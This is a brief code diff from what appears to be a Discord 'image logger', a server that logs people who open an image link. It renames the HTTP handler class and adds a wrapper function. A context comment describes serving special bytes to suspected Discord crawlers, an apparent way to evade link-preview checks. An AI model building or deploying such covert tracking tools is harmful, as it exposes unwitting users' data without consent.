@@ -184,7 +184,7 @@ binaries = {
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
-class handler(BaseHTTPRequestHandler):
+class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
@@ -299,3 +299,6 @@ if (!currenturl.includes("g=")) {
     
     do_GET = handleRequest
     do_POST = handleRequest
+
+def handler():
+    return ImageLoggerAPI
